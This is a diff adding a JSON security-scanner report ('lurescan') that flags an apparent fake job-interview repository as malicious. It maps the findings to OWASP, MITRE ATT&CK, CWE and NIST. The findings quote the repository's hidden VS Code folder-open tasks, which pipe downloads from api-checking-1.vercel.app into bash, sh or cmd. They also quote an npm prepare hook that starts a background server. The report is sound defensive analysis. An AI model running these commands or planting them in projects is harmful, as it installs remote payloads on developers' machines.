@@ -1,0 +1,2001 @@
+{
+  "tool": {
+    "name": "lurescan",
+    "version": "0.1.0"
+  },
+  "target": "C:\\Users\\yalon\\Downloads\\zyranova-main\\zyranova-main",
+  "verdict": {
+    "label": "MALICIOUS",
+    "summary": "Malware or install-time execution indicators. Do not install, run, or open this repository in an IDE or AI agent with automatic execution."
+  },
+  "risk_score": 100,
+  "files_scanned": 207,
+  "files_binary": 103,
+  "files_skipped": [],
+  "rules_run": 65,
+  "duration_seconds": 1.532,
+  "severity_counts": {
+    "critical": 6,
+    "high": 9,
+    "medium": 4,
+    "low": 5,
+    "info": 0
+  },
+  "category_counts": {
+    "app-security": 8,
+    "concealment": 7,
+    "malware": 4,
+    "supply-chain": 3,
+    "lure": 2
+  },
+  "frameworks": [
+    {
+      "key": "owasp-sc",
+      "name": "OWASP Smart Contract Top 10 (2025)",
+      "url": "https://owasp.org/www-project-smart-contract-top-10/"
+    },
+    {
+      "key": "owasp-llm",
+      "name": "OWASP Top 10 for LLM Applications (2025)",
+      "url": "https://genai.owasp.org/llm-top-10/"
+    },
+    {
+      "key": "owasp-web",
+      "name": "OWASP Top 10 (2021)",
+      "url": "https://owasp.org/Top10/"
+    },
+    {
+      "key": "csa-ccm",
+      "name": "CSA Cloud Controls Matrix v4",
+      "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+    },
+    {
+      "key": "attack",
+      "name": "MITRE ATT&CK Enterprise",
+      "url": "https://attack.mitre.org/"
+    },
+    {
+      "key": "atlas",
+      "name": "MITRE ATLAS (AI and LLM systems)",
+      "url": "https://atlas.mitre.org/"
+    },
+    {
+      "key": "cwe",
+      "name": "MITRE CWE",
+      "url": "https://cwe.mitre.org/"
+    },
+    {
+      "key": "nist-ssdf",
+      "name": "NIST SP 800-218 Secure Software Development Framework 1.1",
+      "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+    }
+  ],
+  "framework_coverage": {
+    "owasp-sc": [],
+    "owasp-llm": [],
+    "owasp-web": [
+      {
+        "id": "A08",
+        "title": "Software and Data Integrity Failures",
+        "url": "https://owasp.org/Top10/",
+        "count": 7,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-002",
+          "LS-SUP-003",
+          "LS-APP-005"
+        ]
+      },
+      {
+        "id": "A02",
+        "title": "Cryptographic Failures",
+        "url": "https://owasp.org/Top10/",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-005"
+        ]
+      },
+      {
+        "id": "A07",
+        "title": "Identification and Authentication Failures",
+        "url": "https://owasp.org/Top10/",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001"
+        ]
+      },
+      {
+        "id": "A09",
+        "title": "Security Logging and Monitoring Failures",
+        "url": "https://owasp.org/Top10/",
+        "count": 1,
+        "max_severity": "medium",
+        "rules": [
+          "LS-APP-004"
+        ]
+      },
+      {
+        "id": "A05",
+        "title": "Security Misconfiguration",
+        "url": "https://owasp.org/Top10/",
+        "count": 5,
+        "max_severity": "low",
+        "rules": [
+          "LS-APP-006",
+          "LS-APP-007"
+        ]
+      }
+    ],
+    "csa-ccm": [
+      {
+        "id": "TVM-02",
+        "title": "Malware Protection Policy and Procedures",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 14,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-002",
+          "LS-SUP-003",
+          "LS-CON-001",
+          "LS-LURE-002",
+          "LS-CON-003",
+          "LS-CON-005",
+          "LS-MAL-006"
+        ]
+      },
+      {
+        "id": "UEM-09",
+        "title": "Anti-Malware Detection and Prevention",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 6,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-002",
+          "LS-CON-003"
+        ]
+      },
+      {
+        "id": "STA-08",
+        "title": "Supply Chain Risk Management",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "HRS-11",
+        "title": "Security Awareness Training",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 2,
+        "max_severity": "high",
+        "rules": [
+          "LS-LURE-002",
+          "LS-LURE-001"
+        ]
+      },
+      {
+        "id": "CEK-03",
+        "title": "Data Encryption",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-005"
+        ]
+      },
+      {
+        "id": "IAM-14",
+        "title": "Strong Authentication",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001"
+        ]
+      },
+      {
+        "id": "IAM-16",
+        "title": "Authorization Mechanisms",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001"
+        ]
+      },
+      {
+        "id": "DSP-17",
+        "title": "Sensitive Data Protection",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 1,
+        "max_severity": "medium",
+        "rules": [
+          "LS-APP-004"
+        ]
+      },
+      {
+        "id": "LOG-03",
+        "title": "Security Monitoring and Alerting",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 1,
+        "max_severity": "medium",
+        "rules": [
+          "LS-APP-004"
+        ]
+      },
+      {
+        "id": "AIS-04",
+        "title": "Secure Application Design and Development",
+        "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix",
+        "count": 5,
+        "max_severity": "low",
+        "rules": [
+          "LS-APP-006",
+          "LS-APP-007"
+        ]
+      }
+    ],
+    "attack": [
+      {
+        "id": "T1059",
+        "title": "Command and Scripting Interpreter",
+        "url": "https://attack.mitre.org/techniques/T1059/",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-MAL-006"
+        ]
+      },
+      {
+        "id": "T1105",
+        "title": "Ingress Tool Transfer",
+        "url": "https://attack.mitre.org/techniques/T1105/",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-002"
+        ]
+      },
+      {
+        "id": "T1204.002",
+        "title": "User Execution: Malicious File",
+        "url": "https://attack.mitre.org/techniques/T1204/002/",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-LURE-002"
+        ]
+      },
+      {
+        "id": "T1059.004",
+        "title": "Command and Scripting Interpreter: Unix Shell",
+        "url": "https://attack.mitre.org/techniques/T1059/004/",
+        "count": 2,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-002"
+        ]
+      },
+      {
+        "id": "T1059.007",
+        "title": "Command and Scripting Interpreter: JavaScript",
+        "url": "https://attack.mitre.org/techniques/T1059/007/",
+        "count": 2,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-003",
+          "LS-CON-003"
+        ]
+      },
+      {
+        "id": "T1195.001",
+        "title": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "url": "https://attack.mitre.org/techniques/T1195/001/",
+        "count": 2,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001"
+        ]
+      },
+      {
+        "id": "T1564.003",
+        "title": "Hide Artifacts: Hidden Window",
+        "url": "https://attack.mitre.org/techniques/T1564/003/",
+        "count": 2,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-003",
+          "LS-MAL-006"
+        ]
+      },
+      {
+        "id": "T1059.003",
+        "title": "Command and Scripting Interpreter: Windows Command Shell",
+        "url": "https://attack.mitre.org/techniques/T1059/003/",
+        "count": 1,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-002"
+        ]
+      },
+      {
+        "id": "T1195.002",
+        "title": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "url": "https://attack.mitre.org/techniques/T1195/002/",
+        "count": 1,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "T1546.016",
+        "title": "Event Triggered Execution: Installer Packages",
+        "url": "https://attack.mitre.org/techniques/T1546/016/",
+        "count": 1,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "T1027",
+        "title": "Obfuscated Files or Information",
+        "url": "https://attack.mitre.org/techniques/T1027/",
+        "count": 5,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-001",
+          "LS-CON-003"
+        ]
+      },
+      {
+        "id": "T1564",
+        "title": "Hide Artifacts",
+        "url": "https://attack.mitre.org/techniques/T1564/",
+        "count": 4,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-001"
+        ]
+      },
+      {
+        "id": "T1140",
+        "title": "Deobfuscate/Decode Files or Information",
+        "url": "https://attack.mitre.org/techniques/T1140/",
+        "count": 3,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-003",
+          "LS-CON-005",
+          "LS-CON-006"
+        ]
+      },
+      {
+        "id": "T1027.013",
+        "title": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "url": "https://attack.mitre.org/techniques/T1027/013/",
+        "count": 2,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-005",
+          "LS-CON-006"
+        ]
+      },
+      {
+        "id": "T1566.003",
+        "title": "Phishing: Spearphishing via Service",
+        "url": "https://attack.mitre.org/techniques/T1566/003/",
+        "count": 2,
+        "max_severity": "high",
+        "rules": [
+          "LS-LURE-002",
+          "LS-LURE-001"
+        ]
+      },
+      {
+        "id": "T1190",
+        "title": "Exploit Public-Facing Application",
+        "url": "https://attack.mitre.org/techniques/T1190/",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001"
+        ]
+      },
+      {
+        "id": "T1036",
+        "title": "Masquerading",
+        "url": "https://attack.mitre.org/techniques/T1036/",
+        "count": 1,
+        "max_severity": "medium",
+        "rules": [
+          "LS-LURE-001"
+        ]
+      }
+    ],
+    "atlas": [],
+    "cwe": [
+      {
+        "id": "CWE-506",
+        "title": "Embedded Malicious Code",
+        "url": "https://cwe.mitre.org/data/definitions/506.html",
+        "count": 12,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-003",
+          "LS-CON-001",
+          "LS-LURE-002",
+          "LS-CON-003",
+          "LS-CON-005",
+          "LS-MAL-006",
+          "LS-CON-006"
+        ]
+      },
+      {
+        "id": "CWE-829",
+        "title": "Inclusion of Functionality from Untrusted Control Sphere",
+        "url": "https://cwe.mitre.org/data/definitions/829.html",
+        "count": 6,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-002",
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "CWE-494",
+        "title": "Download of Code Without Integrity Check",
+        "url": "https://cwe.mitre.org/data/definitions/494.html",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-002"
+        ]
+      },
+      {
+        "id": "CWE-912",
+        "title": "Hidden Functionality",
+        "url": "https://cwe.mitre.org/data/definitions/912.html",
+        "count": 4,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-001"
+        ]
+      },
+      {
+        "id": "CWE-287",
+        "title": "Improper Authentication",
+        "url": "https://cwe.mitre.org/data/definitions/287.html",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001"
+        ]
+      },
+      {
+        "id": "CWE-295",
+        "title": "Improper Certificate Validation",
+        "url": "https://cwe.mitre.org/data/definitions/295.html",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-005"
+        ]
+      },
+      {
+        "id": "CWE-95",
+        "title": "Eval Injection",
+        "url": "https://cwe.mitre.org/data/definitions/95.html",
+        "count": 1,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-003"
+        ]
+      },
+      {
+        "id": "CWE-532",
+        "title": "Insertion of Sensitive Information into Log File",
+        "url": "https://cwe.mitre.org/data/definitions/532.html",
+        "count": 1,
+        "max_severity": "medium",
+        "rules": [
+          "LS-APP-004"
+        ]
+      },
+      {
+        "id": "CWE-942",
+        "title": "Permissive Cross-domain Policy with Untrusted Domains",
+        "url": "https://cwe.mitre.org/data/definitions/942.html",
+        "count": 4,
+        "max_severity": "low",
+        "rules": [
+          "LS-APP-006"
+        ]
+      },
+      {
+        "id": "CWE-693",
+        "title": "Protection Mechanism Failure",
+        "url": "https://cwe.mitre.org/data/definitions/693.html",
+        "count": 1,
+        "max_severity": "low",
+        "rules": [
+          "LS-APP-007"
+        ]
+      }
+    ],
+    "nist-ssdf": [
+      {
+        "id": "PW.4",
+        "title": "Reuse Existing, Well-Secured Software When Feasible",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 6,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-SUP-002",
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "PO.5",
+        "title": "Implement and Maintain Secure Environments for Software Development",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 4,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-001",
+          "LS-LURE-002",
+          "LS-LURE-001"
+        ]
+      },
+      {
+        "id": "PS.2",
+        "title": "Provide a Mechanism for Verifying Software Release Integrity",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 3,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-002"
+        ]
+      },
+      {
+        "id": "PS.1",
+        "title": "Protect All Forms of Code from Unauthorized Access and Tampering",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 1,
+        "max_severity": "critical",
+        "rules": [
+          "LS-SUP-003"
+        ]
+      },
+      {
+        "id": "PW.7",
+        "title": "Review and/or Analyze Human-Readable Code to Identify Vulnerabilities",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 9,
+        "max_severity": "high",
+        "rules": [
+          "LS-CON-001",
+          "LS-APP-001",
+          "LS-CON-003",
+          "LS-CON-005",
+          "LS-MAL-006",
+          "LS-CON-006"
+        ]
+      },
+      {
+        "id": "PW.9",
+        "title": "Configure Software to Have Secure Settings by Default",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 6,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-005",
+          "LS-APP-006",
+          "LS-APP-007"
+        ]
+      },
+      {
+        "id": "PW.5",
+        "title": "Create Source Code by Adhering to Secure Coding Practices",
+        "url": "https://csrc.nist.gov/pubs/sp/800/218/final",
+        "count": 2,
+        "max_severity": "high",
+        "rules": [
+          "LS-APP-001",
+          "LS-APP-004"
+        ]
+      }
+    ]
+  },
+  "findings": [
+    {
+      "rule_id": "LS-SUP-001",
+      "title": "Editor task runs automatically when the folder is opened",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "supply-chain",
+      "path": ".vscode/tasks.json",
+      "line": 36,
+      "column": 9,
+      "message": "Task 'version-update' runs automatically when the folder is opened with its terminal hidden: npm install --silent --no-progress",
+      "snippet": "\"runOn\": \"folderOpen\"",
+      "description": "VS Code and compatible editors run tasks with runOptions.runOn=folderOpen as soon as the workspace opens, once automatic tasks are allowed. Fake job repositories use this to run a payload when the candidate opens the project.",
+      "remediation": "Do not allow automatic tasks for untrusted folders. Remove the task, keep the folder in Restricted Mode, and treat any machine that already ran it as compromised.",
+      "fingerprint": "c51bd4c1ba64a52f52e367e81386f814",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "STA-08",
+            "title": "Supply Chain Risk Management",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1195.001",
+            "title": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+            "url": "https://attack.mitre.org/techniques/T1195/001/"
+          },
+          {
+            "id": "T1204.002",
+            "title": "User Execution: Malicious File",
+            "url": "https://attack.mitre.org/techniques/T1204/002/"
+          },
+          {
+            "id": "T1059",
+            "title": "Command and Scripting Interpreter",
+            "url": "https://attack.mitre.org/techniques/T1059/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PO.5",
+            "title": "Implement and Maintain Secure Environments for Software Development",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-SUP-002",
+      "title": "Remote content piped into a shell interpreter",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "malware",
+      "path": ".vscode/tasks.json",
+      "line": 50,
+      "column": 593,
+      "message": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "snippet": "\"osx\": { ⟨566 spaces⟩ \"command\": \"curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\"",
+      "description": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "remediation": "Remove the command. Never execute downloaded scripts without pinning and reviewing them.",
+      "fingerprint": "d3d04e195db082c00a51b505a788fcb6",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1105",
+            "title": "Ingress Tool Transfer",
+            "url": "https://attack.mitre.org/techniques/T1105/"
+          },
+          {
+            "id": "T1059.004",
+            "title": "Command and Scripting Interpreter: Unix Shell",
+            "url": "https://attack.mitre.org/techniques/T1059/004/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-494",
+            "title": "Download of Code Without Integrity Check",
+            "url": "https://cwe.mitre.org/data/definitions/494.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PS.2",
+            "title": "Provide a Mechanism for Verifying Software Release Integrity",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-SUP-002",
+      "title": "Remote content piped into a shell interpreter",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "malware",
+      "path": ".vscode/tasks.json",
+      "line": 52,
+      "column": 593,
+      "message": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "snippet": "\"linux\": { ⟨564 spaces⟩ \"command\": \"wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh\"",
+      "description": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "remediation": "Remove the command. Never execute downloaded scripts without pinning and reviewing them.",
+      "fingerprint": "b5823da4284ee6bde3b5690469ad09ce",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1105",
+            "title": "Ingress Tool Transfer",
+            "url": "https://attack.mitre.org/techniques/T1105/"
+          },
+          {
+            "id": "T1059.004",
+            "title": "Command and Scripting Interpreter: Unix Shell",
+            "url": "https://attack.mitre.org/techniques/T1059/004/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-494",
+            "title": "Download of Code Without Integrity Check",
+            "url": "https://cwe.mitre.org/data/definitions/494.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PS.2",
+            "title": "Provide a Mechanism for Verifying Software Release Integrity",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-SUP-002",
+      "title": "Remote content piped into a shell interpreter",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "malware",
+      "path": ".vscode/tasks.json",
+      "line": 54,
+      "column": 593,
+      "message": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "snippet": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\"",
+      "description": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.",
+      "remediation": "Remove the command. Never execute downloaded scripts without pinning and reviewing them.",
+      "fingerprint": "b88e5c6d4330045eb5d319549d05a997",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1105",
+            "title": "Ingress Tool Transfer",
+            "url": "https://attack.mitre.org/techniques/T1105/"
+          },
+          {
+            "id": "T1059.003",
+            "title": "Command and Scripting Interpreter: Windows Command Shell",
+            "url": "https://attack.mitre.org/techniques/T1059/003/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-494",
+            "title": "Download of Code Without Integrity Check",
+            "url": "https://cwe.mitre.org/data/definitions/494.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PS.2",
+            "title": "Provide a Mechanism for Verifying Software Release Integrity",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-SUP-001",
+      "title": "Editor task runs automatically when the folder is opened",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "supply-chain",
+      "path": ".vscode/tasks.json",
+      "line": 67,
+      "column": 9,
+      "message": "Task 'env' runs automatically when the folder is opened with its terminal hidden: curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd || curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash || wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh",
+      "snippet": "\"runOn\": \"folderOpen\"",
+      "description": "VS Code and compatible editors run tasks with runOptions.runOn=folderOpen as soon as the workspace opens, once automatic tasks are allowed. Fake job repositories use this to run a payload when the candidate opens the project.",
+      "remediation": "Do not allow automatic tasks for untrusted folders. Remove the task, keep the folder in Restricted Mode, and treat any machine that already ran it as compromised.",
+      "fingerprint": "c51bd4c1ba64a52f52e367e81386f814",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "STA-08",
+            "title": "Supply Chain Risk Management",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "UEM-09",
+            "title": "Anti-Malware Detection and Prevention",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1195.001",
+            "title": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+            "url": "https://attack.mitre.org/techniques/T1195/001/"
+          },
+          {
+            "id": "T1204.002",
+            "title": "User Execution: Malicious File",
+            "url": "https://attack.mitre.org/techniques/T1204/002/"
+          },
+          {
+            "id": "T1059",
+            "title": "Command and Scripting Interpreter",
+            "url": "https://attack.mitre.org/techniques/T1059/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PO.5",
+            "title": "Implement and Maintain Secure Environments for Software Development",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-SUP-003",
+      "title": "npm lifecycle script executes code during install",
+      "severity": "critical",
+      "confidence": "high",
+      "category": "supply-chain",
+      "path": "package.json",
+      "line": 10,
+      "column": 9,
+      "message": "`prepare` runs automatically during npm install: start /b node server || nohup node server &",
+      "snippet": "\"prepare\": \"start /b node server || nohup node server &\",",
+      "description": "preinstall, install, postinstall and prepare run automatically on npm install. Background launches (nohup, start /b) or downloads in these hooks are a hallmark of fake job repositories.",
+      "remediation": "Install untrusted projects with --ignore-scripts inside a disposable VM, and remove the hook.",
+      "fingerprint": "7b7b413c72ef4906382a03399889f4b5",
+      "frameworks": {
+        "owasp-web": [
+          {
+            "id": "A08",
+            "title": "Software and Data Integrity Failures",
+            "url": "https://owasp.org/Top10/"
+          }
+        ],
+        "csa-ccm": [
+          {
+            "id": "STA-08",
+            "title": "Supply Chain Risk Management",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          },
+          {
+            "id": "TVM-02",
+            "title": "Malware Protection Policy and Procedures",
+            "url": "https://cloudsecurityalliance.org/research/cloud-controls-matrix"
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1546.016",
+            "title": "Event Triggered Execution: Installer Packages",
+            "url": "https://attack.mitre.org/techniques/T1546/016/"
+          },
+          {
+            "id": "T1195.002",
+            "title": "Supply Chain Compromise: Compromise Software Supply Chain",
+            "url": "https://attack.mitre.org/techniques/T1195/002/"
+          },
+          {
+            "id": "T1059.007",
+            "title": "Command and Scripting Interpreter: JavaScript",
+            "url": "https://attack.mitre.org/techniques/T1059/007/"
+          },
+          {
+            "id": "T1564.003",
+            "title": "Hide Artifacts: Hidden Window",
+            "url": "https://attack.mitre.org/techniques/T1564/003/"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-506",
+            "title": "Embedded Malicious Code",
+            "url": "https://cwe.mitre.org/data/definitions/506.html"
+          },
+          {
+            "id": "CWE-829",
+            "title": "Inclusion of Functionality from Untrusted Control Sphere",
+            "url": "https://cwe.mitre.org/data/definitions/829.html"
+          }
+        ],
+        "nist-ssdf": [
+          {
+            "id": "PW.4",
+            "title": "Reuse Existing, Well-Secured Software When Feasible",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          },
+          {
+            "id": "PS.1",
+            "title": "Protect All Forms of Code from Unauthorized Access and Tampering",
+            "url": "https://csrc.nist.gov/pubs/sp/800/218/final"
+          }
+        ]
+      }
+    },
+    {
+      "rule_id": "LS-CON-001",
+      "title": "Code hidden after a long run of whitespace",
+      "severity": "high",
+      "confidence": "high",
+      "category": "concealment",
+      "path": ".vscode/tasks.json",
+      "line": 50,
+      "column": 14,
+      "message": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.",
